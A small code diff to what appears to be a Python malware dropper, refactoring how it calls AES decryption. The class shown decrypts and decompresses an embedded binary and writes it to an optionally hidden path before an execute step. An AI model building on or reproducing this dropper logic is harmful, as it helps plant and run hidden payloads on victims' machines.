@@ -5,7 +5,7 @@
 import zlib 
 from time import sleep
 from lib.file import File
-from lib.aes import decrypt
+from lib.aes import CryptoAES
 from lib.pathfinder import Finder
 
 class Dropper(object):
@@ -21,7 +21,7 @@ class Dropper(object):
     def unpack(self):
         self.path = Finder.find() + self.name if self.hide else self.name
         print('Path:', self.path)
-        data = zlib.decompress(decrypt(self.binary, self.key))
+        data = zlib.decompress(CryptoAES.decrypt(self.binary, self.key))
         File.write(self.path, data)
 
     def execute(self):
